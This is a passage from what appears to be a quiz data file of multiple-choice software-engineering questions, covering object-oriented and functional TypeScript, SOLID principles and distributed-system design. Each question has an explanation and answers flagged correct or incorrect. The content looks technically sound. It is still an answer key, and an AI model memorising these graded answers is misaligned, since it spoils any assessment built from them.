\`\`\``,
        explanation: `The inheritance tree combinatorially explodes: every combination of add-ons (soy, extra shot, iced, mocha…) needs its own subclass. This is the textbook motivation for the **Decorator pattern**, an application of **composition over inheritance**.

Instead of subclassing, wrap a base object in decorator objects that share the same interface and each add one piece of behavior:

\`\`\`typescript
interface Beverage { cost(): number; description(): string; }

class Coffee implements Beverage {
  cost() { return 2.0; }
  description() { return "Coffee"; }
}

abstract class AddOn implements Beverage {
  constructor(protected inner: Beverage) {}
  abstract cost(): number;
  abstract description(): string;
}

class Soy extends AddOn {
  cost() { return this.inner.cost() + 0.4; }
  description() { return this.inner.description() + " + Soy"; }
}
class ExtraShot extends AddOn {
  cost() { return this.inner.cost() + 0.6; }
  description() { return this.inner.description() + " + Extra Shot"; }
}

// Compose at runtime, in any combination, with no new classes:
const order = new ExtraShot(new Soy(new Coffee()));
order.cost();        // 3.0
order.description(); // "Coffee + Soy + Extra Shot"
\`\`\`

Now *N* add-ons require *N* decorator classes, and they combine freely at runtime instead of requiring a class per combination (which would be 2^N). This embodies **"favor composition over inheritance"** and the **Open/Closed Principle** — you extend behavior by adding new decorators without modifying existing classes. Java's \`java.io\` streams (\`BufferedInputStream(new FileInputStream(...))\`) are a canonical real-world example.`,
        answers: [
          {
            answer: "Use the Decorator pattern — wrap a base `Beverage` in add-on decorators that share its interface and each add one cost/behavior. It embodies composition over inheritance (and the Open/Closed Principle), so N add-ons combine freely instead of needing a subclass per combination.",
            isCorrect: true,
          },
          {
            answer: "Use the Singleton pattern so only one `Coffee` instance exists; shared mutable add-on flags on that instance eliminate the need for subclasses.",
            isCorrect: false,
          },
          {
            answer: "Deepen the inheritance hierarchy further and mark intermediate classes `abstract`; abstract base classes automatically collapse combinatorial subclasses.",
            isCorrect: false,
          },
          {
            answer: "Switch every add-on to a static utility function that mutates a global order object; global mutation is the standard fix for class explosion.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Which of these functions are **pure**?

\`\`\`typescript
let taxRate = 0.2;

const a = (price: number) => price * (1 + taxRate);

const b = (items: number[]) => {
  items.push(0);
  return items.length;
};

const c = (price: number, rate: number) => price * (1 + rate);

const d = (price: number) => {
  console.log(price);
  return price * 2;
};
\`\`\``,
        explanation: `A **pure function** satisfies two conditions:
1. **Deterministic**: the same inputs always produce the same output.
2. **No side effects**: it doesn't mutate external state or its arguments, or perform I/O.

- **\`a\`** reads the mutable outer variable \`taxRate\`. If \`taxRate\` changes, \`a(100)\` returns a different value, so it isn't deterministic.
- **\`b\`** **mutates its argument** (\`items.push\`), which is a side effect visible to the caller.
- **\`c\`** depends only on its parameters and changes nothing, so it's **pure**.
- **\`d\`** writes to the console, which is I/O and therefore a side effect.

Pure functions are **referentially transparent**: any call can be replaced with its result without changing program behavior. That makes them trivial to test, safe to memoize, and safe to run in parallel or reorder. Functional architectures push side effects (I/O, logging, mutation) to the edges, sometimes described as a "functional core, imperative shell".`,
        answers: [
          {
            answer: `Only \`c\`.`,
            isCorrect: true,
          },
          {
            answer: `\`a\` and \`c\`. Reading an outer variable is fine as long as the function doesn't write to it.`,
            isCorrect: false,
          },
          {
            answer: `\`c\` and \`d\`. Logging doesn't change the return value, so it doesn't count as a side effect.`,
            isCorrect: false,
          },
          {
            answer: `\`a\`, \`c\`, and \`d\`. Only \`b\` is impure, because only \`b\` mutates data.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What happens when this code runs?

\`\`\`javascript
"use strict";

const config = Object.freeze({
  db: { host: "localhost" },
  retries: 3,
});

config.db.host = "prod.example.com";
console.log(config.db.host);

config.retries = 5;
\`\`\``,
        explanation: `**\`Object.freeze\` is shallow.** It makes the object's *own* properties non-writable and non-configurable and prevents adding new ones, but it doesn't freeze nested objects.

- \`config.db\` is a reference to a separate, unfrozen object, so \`config.db.host = "prod.example.com"\` **succeeds**, and the log prints \`prod.example.com\`.
- \`config.retries = 5\` writes to a frozen property. In **strict mode** this throws \`TypeError: Cannot assign to read only property 'retries'\`. (In sloppy mode it would fail silently.)

Deep immutability needs a recursive "deep freeze", immutable data structures (Immutable.js), or structural-sharing helpers like Immer.

In TypeScript, \`Readonly<T>\` and \`as const\` provide **compile-time** immutability only (also shallow for \`Readonly<T>\`). They have no runtime effect.`,
        answers: [
          {
            answer: `It logs \`prod.example.com\`, then throws a \`TypeError\` on \`config.retries = 5\`. \`freeze\` is shallow, so the nested \`db\` object stays mutable.`,
            isCorrect: true,
          },
          {
            answer: `It throws a \`TypeError\` on the first assignment, because \`Object.freeze\` recursively freezes nested objects.`,
            isCorrect: false,
          },
          {
            answer: `It logs \`localhost\`, and both assignments silently fail.`,
            isCorrect: false,
          },
          {
            answer: `It logs \`prod.example.com\`, and \`config.retries\` silently stays \`3\`, since frozen objects never throw.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does this log, and which terms correctly describe \`add3\` and \`addTo10\`?

\`\`\`typescript
const add3 = (a: number) => (b: number) => (c: number) => a + b + c;

const addTo10 = add3(10);
console.log(addTo10(5)(1));
\`\`\``,
        explanation: `**Currying** transforms a function of N arguments into a chain of N **unary** functions, each returning the next. \`add3\` is a curried three-argument addition: \`add3(a)(b)(c)\`.

**Partial application** fixes *some* of a function's arguments and produces a new function that takes the rest. \`add3(10)\` partially applies \`a = 10\`, giving \`addTo10\`, which still needs \`b\` and \`c\`.

\`addTo10(5)(1)\` computes \`10 + 5 + 1 = 16\`. Each inner arrow function forms a **closure** over the arguments supplied so far.

Currying makes it easy to build specialized functions and to compose them in \`pipe\`/\`compose\` chains, where every step must take exactly one argument:

\`\`\`typescript
const withPrefix = (prefix: string) => (msg: string) => \`\${prefix} \${msg}\`;
const warn = withPrefix("[WARN]");
\`\`\``,
        answers: [
          {
            answer: `\`16\`. \`add3\` is a curried function (a chain of unary functions), and \`addTo10\` is the result of partially applying it with \`a = 10\`.`,
            isCorrect: true,
          },
          {
            answer: `\`16\`. \`add3\` is a higher-order *memoized* function, and \`addTo10\` is a cached result.`,
            isCorrect: false,
          },
          {
            answer: `A function. \`addTo10(5)(1)\` still needs one more argument, because currying adds an extra level.`,
            isCorrect: false,
          },
          {
            answer: `\`NaN\`. \`c\` is \`undefined\` when the inner function runs, because closures don't capture arguments from outer calls.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Unit testing \`OrderService\` is painful: tests need a real Postgres database and accidentally send real emails. Which design principle does this class violate, and what's the fix?

\`\`\`typescript
class OrderService {
  private repo = new PostgresOrderRepository();
  private mailer = new SendGridMailer();

  async place(order: Order) {
    await this.repo.save(order);
    await this.mailer.send(order.customerEmail, "Order confirmed");
  }
}
\`\`\``,
        explanation: `The **Dependency Inversion Principle** (the "D" in SOLID) says:
1. High-level modules (business logic like \`OrderService\`) shouldn't depend on low-level modules (Postgres, SendGrid). Both should depend on **abstractions**.
2. Abstractions shouldn't depend on details.

Here \`OrderService\` constructs its concrete dependencies itself, so it's **tightly coupled** to them. You can't substitute an in-memory repository or a fake mailer in tests, or switch providers, without editing the class.

Fix: define interfaces owned by the domain, and **inject** implementations, usually via the constructor:

\`\`\`typescript
interface OrderRepository { save(order: Order): Promise<void> }
interface Mailer { send(to: string, subject: string): Promise<void> }

class OrderService {
  constructor(
    private readonly repo: OrderRepository,
    private readonly mailer: Mailer,
  ) {}
  // ...
}

// production
new OrderService(new PostgresOrderRepository(), new SendGridMailer());
// test
new OrderService(new InMemoryOrderRepository(), new FakeMailer());
\`\`\`

Dependency injection (constructor injection, optionally with a DI container) is the technique. DIP is the principle.`,
        answers: [
          {
            answer: `The Dependency Inversion Principle. Have \`OrderService\` depend on \`OrderRepository\` and \`Mailer\` interfaces, and inject concrete implementations through the constructor so tests can pass fakes.`,
            isCorrect: true,
          },
          {
            answer: `The Single Responsibility Principle. Split \`place\` into two classes, one that saves and one that sends email, and the coupling goes away.`,
            isCorrect: false,
          },
          {
            answer: `The Liskov Substitution Principle. Make \`OrderService\` extend \`PostgresOrderRepository\` so it inherits \`save\`.`,
            isCorrect: false,
          },
          {
            answer: `The Interface Segregation Principle. Make the repository and mailer singletons so the tests share one instance.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `This function is edited every time the business adds a shipping carrier, and similar \`switch (order.carrier)\` blocks exist in six other places (labels, tracking URLs, cut-off times, ...). Which refactoring best addresses this?

\`\`\`typescript
function shippingCost(order: Order): number {
  switch (order.carrier) {
    case "ups":   return 5 + order.weightKg * 1.2;
    case "fedex": return 7 + order.weightKg * 1.0;
    case "dhl":   return 6 + order.weightKg * 1.1;
    default: throw new Error(\`Unknown carrier \${order.carrier}\`);
  }
}
\`\`\``,
        explanation: `Scattered type-switches violate the **Open/Closed Principle**: modules should be *open for extension but closed for modification*. Adding a carrier means hunting down and editing every switch, and missing one is a bug.

The **Strategy pattern** replaces conditional logic with **polymorphism**. Each carrier is an object that implements a common interface and encapsulates *all* carrier-specific behavior:

\`\`\`typescript
interface Carrier {
  cost(order: Order): number;
  label(order: Order): Label;
  trackingUrl(id: string): string;
}

const carriers: Record<string, Carrier> = {
  ups: new UpsCarrier(),
  fedex: new FedexCarrier(),
  dhl: new DhlCarrier(),
};

const shippingCost = (order: Order) => carriers[order.carrier].cost(order);
\`\`\`

Adding a carrier now means writing one new class and registering it, with no edits to existing logic. (A functional alternative is a map of carrier name → object of functions. It's the same idea.)

A long switch isn't always wrong. For a closed set that rarely changes, a discriminated union with an exhaustive switch is fine. The smell here is *frequent change* combined with *duplication across many places*.`,
        answers: [
          {
            answer: `Apply the Strategy pattern. Define a \`Carrier\` interface with \`cost\`, \`label\`, \`trackingUrl\`, etc., implement one class per carrier, and look carriers up from a registry, so new carriers are added without modifying existing code (Open/Closed Principle).`,
            isCorrect: true,
          },
          {
            answer: `Create a base \`Order\` class and a subclass per carrier (\`UpsOrder\`, \`FedexOrder\`, ...), so the order type determines the carrier.`,
            isCorrect: false,
          },
          {
            answer: `Replace the \`switch\` with an \`if/else\` chain. It's more readable and performs better for string comparisons.`,
            isCorrect: false,
          },
          {
            answer: `Move all seven \`switch\` statements into one \`CarrierUtils\` class with static methods, so they're edited in one file.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does this code print?

\`\`\`typescript
class Account {
  private balance = 100;
  #pin = 1234;
}

const acct = new Account();
console.log((acct as any).balance);
console.log((acct as any)["#pin"]);
console.log(JSON.stringify(acct));
\`\`\``,
        explanation: `TypeScript's **\`private\` modifier is compile-time only**. It's erased during compilation, so at runtime \`balance\` is an ordinary public property. Casting to \`any\` (or using bracket notation) bypasses the check, so \`acct.balance\` is \`100\`, and it shows up in \`JSON.stringify\`, \`Object.keys\`, and console logs.

**\`#pin\`** is a JavaScript **private class field** (ES2022), enforced by the runtime ("hard privacy"):
- It isn't a string-keyed property at all, so \`acct["#pin"]\` looks up a property literally named \`"#pin"\`, which doesn't exist: \`undefined\`.
- It's invisible to \`JSON.stringify\`, \`Object.keys\`, \`for...in\`, and proxies.
- Accessing \`acct.#pin\` outside the class body is a **syntax error**.

Output:
\`\`\`
100
undefined
{"balance":100}
\`\`\`

Use \`#private\` when the data must be truly encapsulated, such as secrets or library internals. TS \`private\` is fine for design-time encapsulation within a codebase you control.`,
        answers: [
          {
            answer: `\`100\`, \`undefined\`, \`{"balance":100}\`. TypeScript's \`private\` is erased at runtime, while \`#pin\` is a true runtime-private field that isn't reachable by any string key.`,
            isCorrect: true,
          },
          {
            answer: `\`undefined\`, \`undefined\`, \`{}\`. Both modifiers hide the fields at runtime.`,
            isCorrect: false,
          },
          {
            answer: `\`100\`, \`1234\`, \`{"balance":100,"#pin":1234}\`. \`#\` is just a naming convention for private fields.`,
            isCorrect: false,
          },
          {
            answer: `A runtime \`TypeError\` on the first \`console.log\`, because accessing a \`private\` member throws.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does this code log?

\`\`\`typescript
type Result<T, E> = { ok: true; value: T } | { ok: false; error: E };

const map = <T, U, E>(r: Result<T, E>, f: (t: T) => U): Result<U, E> =>
  r.ok ? { ok: true, value: f(r.value) } : r;

const parseAge = (s: string): Result<number, string> => {
  const n = Number(s);
  return Number.isInteger(n) && n >= 0
    ? { ok: true, value: n }
    : { ok: false, error: \`bad age: \${s}\` };
};

console.log(map(parseAge("abc"), (n) => n + 1));
\`\`\``,
        explanation: `\`Number("abc")\` is \`NaN\`, and \`Number.isInteger(NaN)\` is \`false\`, so \`parseAge\` returns \`{ ok: false, error: "bad age: abc" }\`.

\`map\` only applies \`f\` on the **success** branch. On the failure branch it returns the error **unchanged**, so \`f\` is never called. The output is:

\`\`\`
{ ok: false, error: 'bad age: abc' }
\`\`\`

This is the **Result (Either) type** from functional programming. It's a *functor*: \`map\` transforms the success value while passing failures through. Adding a \`flatMap\` (\`andThen\`) that chains functions which themselves return \`Result\` makes it monadic.

Compared to throwing exceptions:
- Failures are **visible in the type signature**, and the compiler forces callers to handle them.
- Pipelines of fallible steps compose cleanly, short-circuiting on the first error without \`try/catch\` at every level.

Libraries like \`neverthrow\` and \`Effect\` offer production-ready versions. Rust's \`Result\` and Haskell's \`Either\` are the canonical examples.`,
        answers: [
          {
            answer: `\`{ ok: false, error: 'bad age: abc' }\`. \`map\` passes the failure through untouched and never calls the mapping function.`,
            isCorrect: true,
          },
          {
            answer: `\`{ ok: true, value: NaN }\`. \`Number("abc")\` produces \`NaN\`, which is a valid number, and \`map\` adds 1 to it.`,
            isCorrect: false,
          },
          {
            answer: `It throws \`TypeError: r.value is undefined\`, because \`map\` calls \`f\` on the error branch.`,
            isCorrect: false,
          },
          {
            answer: `\`{ ok: false, error: 'bad age: abc', value: NaN }\`. \`map\` merges the mapped value into the error result.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "System Design & Architecture",
    questions: [
      {
        question: `Your team horizontally shards a PostgreSQL users table by \`user_id\` across 8 shards. A new feature requires looking up a user by \`email\` address (unique, but not the shard key). What happens when this query executes, and what is the standard mitigation?

\`\`\`sql
SELECT * FROM users WHERE email = 'alice@example.com';
\`\`\``,
        explanation: `When a table is sharded by a key, the routing layer uses that key to direct queries to exactly one shard. A query on a **non-shard-key column** provides no routing information — the system cannot know which shard holds the row without inspecting all of them. The result is a **scatter-gather (fan-out) query**: the query is broadcast to every shard, each returns its matches, and the coordinator merges the results. At 8 shards this is manageable; at hundreds of shards it becomes a serious bottleneck.

The standard mitigation is a **lookup table**: a small, unsharded table that maps \`email → user_id\`. The application first queries the lookup table to resolve the \`user_id\`, then issues a routed single-shard query. AWS DynamoDB's Global Secondary Indexes and Vitess's VSchema implement this pattern at the infrastructure level. Another option is to maintain a search index (e.g., Elasticsearch) for non-key lookups.`,
        answers: [
          {
            answer: "The query fan-outs to all 8 shards (scatter-gather). The standard fix is a separate `email → user_id` lookup table to enable routed single-shard lookups.",
            isCorrect: true,
          },
          {
            answer: "The query is automatically routed to the shard holding the matching email, since the database adapts when a unique index exists.",
            isCorrect: false,
          },
          {
            answer: "The query fails with an error — non-shard-key lookups are forbidden by the routing layer.",
            isCorrect: false,
          },
          {
            answer: "The query hits only shard 0 and returns an empty result if the user lives on a different shard.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `An e-commerce platform uses synchronous REST calls: when an order is placed, the Order Service calls the Inventory Service, Payment Service, and Notification Service **in sequence** before responding to the client. The Notification Service goes down, causing all order placements to fail.

A solutions architect proposes migrating to an **event-driven architecture** using a message broker. What is the primary benefit, and what new operational complexity does it introduce?`,
        explanation: `**Primary benefit: loose coupling and resilience.**

In an event-driven architecture, the Order Service publishes an \`OrderPlaced\` event to a message broker (Kafka, SQS, RabbitMQ) and immediately returns a success response. The Inventory, Payment, and Notification services each subscribe to and process the event independently. The Notification Service being down no longer blocks order placement — it simply falls behind in consuming events and catches up when it recovers. No service is directly dependent on another's availability.

Additional benefits: services can scale independently, teams can deploy them without coordinating releases, and new consumers (e.g., an analytics service) can subscribe without changing the producer.

**New operational complexity:**

1. **Eventual consistency**: the response to the client confirms the *event was accepted*, not that payment was charged or inventory was reserved. The system is eventually consistent — the UI must handle in-progress states gracefully.

2. **Distributed tracing and observability**: a single business transaction (place order → charge payment → reserve inventory → notify) is now spread across multiple async hops. End-to-end tracing (OpenTelemetry correlation IDs) becomes essential.

3. **Failure handling**: failed event processing must be handled via dead-letter queues, retry policies, and idempotency (the same event may be delivered more than once).

4. **Ordering guarantees**: some workflows require events to be processed in order — this requires careful partitioning strategy on brokers like Kafka.`,
        answers: [
          {
            answer: "Primary benefit: loose coupling — the Order Service publishes an event and returns immediately; downstream services fail or lag independently without blocking orders. New complexity: eventual consistency, distributed tracing, idempotent consumers, and dead-letter queue management.",
            isCorrect: true,
          },
          {
            answer: "Primary benefit: lower latency — async messaging is always faster than synchronous HTTP. New complexity: increased memory usage on the broker as events accumulate.",
            isCorrect: false,
          },
          {
            answer: "Primary benefit: data normalization — events carry the full entity state, eliminating the need for each service to maintain its own database. New complexity: events become the source of truth and must be versioned carefully.",
            isCorrect: false,
          },
          {
            answer: "Primary benefit: automatic error handling — the message broker retries failed deliveries indefinitely, so application-level error handling is no longer needed. New complexity: configuring the broker's retry backoff.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A payment API endpoint is called by a mobile client. On flaky networks the client retries requests that time out, occasionally charging the same customer twice. The team wants to guarantee that retrying a request never causes a duplicate charge. What is the standard technique, and how does it work?`,
        explanation: `The technique is an **idempotency key** (idempotent request pattern), used by Stripe, PayPal, and most robust payment APIs.

**How it works:**
1. The client generates a unique key (typically a UUID) for each *logical* operation — e.g., "charge $50 for order #123" — and sends it in a header: \`Idempotency-Key: 9f8b...\`. Critically, **retries of the same operation reuse the same key**.
2. On the server, before performing the charge, it checks a store (often Redis or a dedicated table) for that key:
   - **Key not seen** → process the charge, then store the key together with the response (status + body) atomically.
   - **Key already seen and completed** → skip the charge entirely and return the *stored* original response.
   - **Key seen but still in progress** → return a "request in progress" / conflict response (or wait), so two concurrent retries don't both execute.
3. Keys are given a TTL (e.g., 24 hours) since retries happen within a short window.

The result: no matter how many times the client retries after a timeout, the charge executes **at most once**, and every retry returns the same response as the original. This safely turns an unreliable, at-least-once delivery channel into effectively exactly-once *semantics* for the side effect.

Important nuances: the check-and-store must be **atomic** (e.g., an \`INSERT ... ON CONFLICT\` or a Redis \`SET NX\`) to handle concurrent retries; and the key must key on the *operation*, not be regenerated per HTTP attempt — otherwise retries look like new requests.`,
        answers: [
          {
            answer: "Use an idempotency key: the client sends a unique key per logical operation (reused on retries); the server atomically records it, performs the charge only the first time it sees the key, and returns the stored original response for any retry.",
            isCorrect: true,
          },
          {
            answer: "Switch the endpoint from POST to PUT — PUT is idempotent by definition in HTTP, so the network layer automatically prevents the server from processing a retried charge twice.",
            isCorrect: false,
          },
          {
            answer: "Increase the client's request timeout so retries never fire; if the client never retries, duplicate charges cannot happen and no server-side changes are needed.",
            isCorrect: false,
          },
          {
            answer: "Wrap the charge in a database transaction with `SERIALIZABLE` isolation; transaction isolation guarantees that two separate HTTP requests for the same charge are collapsed into one.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A product page uses cache-aside with Redis: on a miss, the service queries the database and writes the result back with a 60-second TTL. Every time the homepage's most popular product key expires, database CPU spikes to 100% and requests time out for several seconds. What's happening, and what's an effective mitigation?`,
        explanation: `This is a **cache stampede** (also called "thundering herd" or "dog-piling"). While the hot key is missing, **every concurrent request** misses the cache and runs the same expensive database query in parallel. Thousands of identical queries hit the database at once, and it falls over just as the cache was supposed to protect it.

Mitigations (often combined):
- **Request coalescing / single-flight.** Only one request recomputes the value. Others wait for it or are served the stale value. In a distributed setting, take a short-lived Redis lock (\`SET key:lock 1 NX PX 5000\`) so only the lock holder queries the DB.
- **Stale-while-revalidate.** Store a soft expiry inside the value with a longer hard TTL. After the soft expiry, serve the stale value while one worker refreshes it in the background.
- **Probabilistic early expiration** (e.g. the XFetch algorithm). Each request has a small, growing chance of refreshing *before* expiry, so refreshes spread out.
- **TTL jitter.** Randomize TTLs so many keys don't expire at the same instant.

Just lengthening the TTL only makes the stampede less frequent. Adding read replicas raises the ceiling, but doesn't stop the synchronized burst.`,
        answers: [
          {
            answer: `A cache stampede: when the hot key expires, all concurrent requests miss and query the DB at once. Use request coalescing (a lock so one request recomputes), stale-while-revalidate, or probabilistic early refresh, plus TTL jitter.`,
            isCorrect: true,
          },
          {
            answer: `Redis evicts hot keys first under its LRU policy. Switch the eviction policy to \`noeviction\` to keep popular keys cached.`,
            isCorrect: false,
          },
          {
            answer: `Cache-aside is the wrong pattern. Use write-around caching so reads always go to the database and the cache can't expire.`,
            isCorrect: false,
          },
          {
            answer: `The 60-second TTL is too long, so cached data becomes large. Lower the TTL to 5 seconds to keep entries small.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A public API must allow each API key a **sustained rate of 10 requests/second** but tolerate **short bursts of up to 100 requests**. The API runs on 12 stateless instances behind a load balancer. Which design meets these requirements?`,
        explanation: `The **token bucket** algorithm models both requirements directly:
- The bucket holds up to **capacity = 100** tokens (the burst allowance).
- Tokens **refill at 10/second** (the sustained rate).
- Each request consumes a token. If none are left, reject with \`429 Too Many Requests\` and a \`Retry-After\` header.

Because there are 12 stateless instances, the bucket state must be **shared**. The usual choice is Redis. The read-refill-consume logic must be **atomic** to avoid races between instances, typically with a Lua script (\`EVAL\`) that stores \`tokens\` and \`last_refill_ts\` per key.

Why the alternatives fail:
- **In-memory limiters on each instance** let each key through at up to 12× the limit, and the effective limit changes as instances scale.
- **Fixed-window counters** (N per calendar second or minute) allow up to 2× the limit around window boundaries and don't model a separate burst size.
- **Sticky sessions** to pin each key to one instance break with scaling and failover, and they skew load.

The **leaky bucket** algorithm, by contrast, smooths output to a constant rate, which suits queue-like shaping rather than allowing bursts.`,
        answers: [
          {
            answer: `A token bucket per API key (capacity 100, refilling 10 tokens/second), with state in Redis updated atomically (e.g. a Lua script) so all instances share one limit.`,
            isCorrect: true,
          },
          {
            answer: `A fixed-window counter of 10 requests per second, kept in each instance's memory.`,
            isCorrect: false,
          },
          {
            answer: `A leaky bucket in each instance that queues excess requests indefinitely, so no request is ever rejected.`,
            isCorrect: false,
          },
          {
            answer: `Sticky sessions so each API key always reaches the same instance, which then enforces a limit of 100 requests/second in memory.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A distributed cache cluster assigns keys to nodes with \`node = hash(key) % N\`. When it scales from 4 to 5 nodes, the cache hit rate collapses and the database is overwhelmed. Approximately what fraction of keys moved, and what technique minimizes this?`,
        explanation: `With modulo hashing, a key stays on the same node only if \`h % 4 == h % 5\`. Over any run of 20 consecutive hash values, that's true only for \`h ≡ 0, 1, 2, 3 (mod 20)\`, which is 4 out of 20. So about **80% of keys move**. They all miss the cache simultaneously, and the database takes the full load.

**Consistent hashing** maps both nodes and keys onto a hash **ring**. Each key belongs to the first node clockwise from it. Adding a node only takes over the keys in its slice of the ring, roughly **1/N of keys (about 20% here)**, all of which come from neighboring nodes. Every other key stays put.

Production systems add **virtual nodes**: each physical node appears at many points on the ring, which evens out the load and spreads a departing node's keys across all the survivors. Consistent hashing (or variants like rendezvous hashing and jump hash) is used by DynamoDB, Cassandra, memcached client libraries, and many load balancers.`,
        answers: [
          {
            answer: `About 80% of keys move with modulo hashing. Consistent hashing (a hash ring, with virtual nodes) remaps only about 1/N of the keys (around 20%) when a node is added.`,
            isCorrect: true,
          },
          {
            answer: `About 20% of keys move, since only one node in five is new. Modulo hashing already behaves optimally.`,
            isCorrect: false,
          },
          {
            answer: `100% of keys move. The fix is to always double the node count, which keeps every key in place.`,
            isCorrect: false,
          },
          {
            answer: `About 50% of keys move. Switching from MD5 to SHA-256 hashing reduces the amount of remapping.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `An order service saves the order and then publishes an event that downstream services rely on. Occasionally, orders exist in the database with no corresponding event. What's the underlying problem, and what's the standard pattern to solve it?

\`\`\`typescript
await db.transaction(async (tx) => {
  await tx.orders.insert(order);
});

await kafka.send({ topic: "order-created", messages: [{ value: JSON.stringify(order) }] });
\`\`\``,
        explanation: `This is the **dual-write problem**. Two separate systems (the database and Kafka) are updated without a shared transaction. If the process crashes, is redeployed, or Kafka is unavailable between the commit and the publish, the order exists but the event is lost forever. Reversing the order just creates the opposite bug: an event for an order that was never committed.

The **Transactional Outbox** pattern fixes this:
1. In the **same database transaction** as the business write, insert the event into an \`outbox\` table.
2. A separate **relay** publishes outbox rows to the broker and marks them as sent. The relay either polls the table or uses **change data capture**, e.g. Debezium tailing the Postgres WAL.

The event is now recorded *if and only if* the order commits. The relay may publish the same event more than once (after a crash between send and mark), so delivery is **at-least-once**, and consumers must be **idempotent** (e.g. dedupe by event ID).

Two-phase commit across Postgres and Kafka isn't practical: Kafka doesn't participate in XA transactions, and 2PC hurts availability. In-process retries don't survive a crash.`,
        answers: [
          {
            answer: `It's the dual-write problem: the DB commit and the Kafka publish aren't atomic. Use a transactional outbox: write the event to an outbox table in the same transaction, and have a relay or CDC process publish it (at-least-once, with idempotent consumers).`,
            isCorrect: true,
          },
          {
            answer: `Publish to Kafka first, then insert the order. If the insert fails, the event will just be ignored by consumers.`,
            isCorrect: false,
          },
          {
            answer: `Wrap both calls in a distributed two-phase commit between Postgres and Kafka, which Kafka supports natively via XA.`,
            isCorrect: false,
          },
          {
            answer: `Wrap \`kafka.send\` in a retry loop with exponential backoff. That guarantees the event is eventually published.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A checkout spans three microservices, each with its own database: **Payment** charges the card, **Inventory** reserves stock, and **Shipping** creates a shipment. If any step fails, the customer must not end up charged for an order that won't ship. Which approach is most appropriate?`,
        explanation: `With a **database per service**, there's no single ACID transaction spanning all three. Two-phase commit across services is fragile (a blocking coordinator, poor availability) and is often unsupported by modern data stores and brokers.

The **Saga pattern** models the workflow as a sequence of **local transactions**. Each has a **compensating action** that semantically undoes it:

| Step | Action | Compensation |
|---|---|---|
| 1 | Reserve stock | Release stock |
| 2 | Charge card | Refund payment |
| 3 | Create shipment | Cancel shipment |

If step 3 fails, the saga runs the compensations for the completed steps in reverse order: refund, then release stock.

Two coordination styles:
- **Orchestration**: a central orchestrator (or a workflow engine like Temporal) tells each service what to do. It's easier to follow and monitor.
- **Choreography**: services react to each other's events. That's looser coupling, but harder to trace as the flow grows.

Sagas provide **eventual consistency, not isolation**. Other transactions can see intermediate states (e.g. stock reserved but payment pending), so designs use semantic locks, pending statuses, and idempotent, retryable steps.`,
        answers: [
          {
            answer: `Use a Saga: a sequence of local transactions, each with a compensating action (refund payment, release stock), coordinated by an orchestrator or by events. This gives eventual consistency rather than ACID isolation.`,
            isCorrect: true,
          },
          {
            answer: `Have all three services share a single database, so a normal ACID transaction can span them. That's the recommended microservice practice.`,
            isCorrect: false,
          },
          {
            answer: `Use two-phase commit across all three services. It's the standard, highly available solution for microservices.`,
            isCorrect: false,
          },
          {
            answer: `Call all three services in parallel and ignore failures. Retries at the API gateway guarantee every step eventually succeeds.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `After a user updates their display name, the profile page reloads and *sometimes* shows the old name for a second or two. Writes go to the primary database; reads go to asynchronously replicated read replicas. What's the issue, and what's a targeted fix?`,
        explanation: `With **asynchronous replication**, replicas trail the primary by some **replication lag**, usually milliseconds but sometimes seconds under load. A read routed to a lagging replica immediately after a write returns stale data. This violates **read-your-writes** (read-after-write) consistency: a user expects to see their *own* changes.

Targeted fixes that keep most reads on replicas:
- **Read from the primary for a short window after a user's write.** Track a "last write at" timestamp in the session or a cookie and route that user's reads to the primary for N seconds.
- **Position-based routing.** Record the primary's log position (Postgres LSN, MySQL GTID) after the write, and only read from a replica that has replayed past that point. Otherwise fall back to the primary.
- Always read data that was **just modified by the current user** (e.g. their own profile) from the primary.
- For simple UIs, **optimistically render** the value the client just submitted.

Making *all* replicas synchronous fixes staleness, but it adds write latency and couples write availability to every replica. Adding more replicas or cache layers doesn't address lag.`,
        answers: [
          {
            answer: `Replication lag breaks read-your-writes consistency. Route that user's reads to the primary for a short period after they write, or only read from replicas that have caught up to the write's log position (LSN).`,
            isCorrect: true,
          },
          {
            answer: `The browser is caching the old page. Add \`Cache-Control: no-store\` and the issue is fully resolved.`,
            isCorrect: false,
          },
          {
            answer: `The replicas are under-provisioned. Adding more read replicas reduces lag proportionally and fixes the problem.`,
            isCorrect: false,
          },
          {
            answer: `The primary hasn't committed the write yet. Switch the update to \`SERIALIZABLE\` isolation so it commits before returning.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `The Product Page service calls a Recommendations service. Recommendations becomes extremely slow (requests hang about 30 seconds before timing out). Within minutes, the Product Page service exhausts its connection pool and event-loop capacity, and the *entire product page* goes down, even though recommendations are optional. Which resilience patterns best prevent this cascading failure?`,
        explanation: `A slow dependency is often worse than a dead one. Every request waiting on it **holds resources** (sockets, pool connections, memory, concurrency slots), and those resources run out, so failure **cascades** upstream.

Key patterns:
- **Aggressive timeouts**, sized to the dependency's normal latency (e.g. p99 plus a margin), not 30 seconds.
- A **circuit breaker** wrapping the call:
  - *Closed*: calls pass through while failures and timeouts are counted.
  - *Open*: once a threshold is exceeded (e.g. 50% failures over 20 calls), calls **fail fast** without touching the dependency, for a cool-down period.
  - *Half-open*: a few trial calls are allowed. Success closes the circuit, and failure opens it again.
- A **fallback** for optional features: render the page without recommendations, or with cached or popular items (**graceful degradation**).
- **Bulkheads**: give the dependency an isolated, bounded pool or concurrency limit, so it can't consume all shared capacity.

Raising timeouts makes resource exhaustion worse. **Immediate retries** multiply load on an already struggling service (a *retry storm*). If you retry at all, use exponential backoff with jitter and retry budgets.`,
        answers: [
          {
            answer: `Use short timeouts plus a circuit breaker that fails fast once Recommendations is unhealthy, with a fallback (render without recommendations) and a bulkhead limiting concurrent calls to that dependency.`,
            isCorrect: true,
